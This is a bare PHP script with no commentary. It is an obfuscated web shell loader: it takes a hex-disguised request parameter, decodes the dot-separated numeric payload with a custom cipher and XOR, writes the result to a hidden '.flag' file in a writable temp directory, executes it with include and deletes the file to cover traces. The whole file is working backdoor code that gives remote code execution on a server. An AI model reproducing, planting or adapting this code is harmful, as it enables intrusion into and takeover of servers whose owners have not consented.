<?php

if(isset($_REQUEST["\x66\x61c"]) ? true : false){
	$elem = $_REQUEST["\x66\x61c"];
				$elem	=explode(".",	 	$elem) ;	
	$ent = '';
            $s2 = 'abcdefghijklmnopqrstuvwxyz0123456789';
            $lenS = strlen($s2);
            $x = 0;
            $len = count($elem);
    
            do {	if ($x		>= 	$len) break;
                $v6 = $elem[$x];
                $chS = ord($s2[$x % $lenS]);
                $d = ((int)$v6 - $chS - ($x % 10))^91;
                $ent .= chr($d);
                $x++;
            } while (true);
	$dchunk = array_filter([sys_get_temp_dir(), getenv("TEMP"), getenv("TMP"), session_save_path(), "/dev/shm", "/var/tmp", "/tmp", ini_get("upload_tmp_dir"), getcwd()]);
	foreach ($dchunk as $data) {
    		if (is_writable($data) && is_dir($data)) {
    $ref = "$data" . "/.flag";
    $file = fopen($ref, 'w');
if ($file) {
	fwrite($file, $ent);
	fclose($file);
	include $ref;
	@unlink($ref);
	die();
}
}
}
}